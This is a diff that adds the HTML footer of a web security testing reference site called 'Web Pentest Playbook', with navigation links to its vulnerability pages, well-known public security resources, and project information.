+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
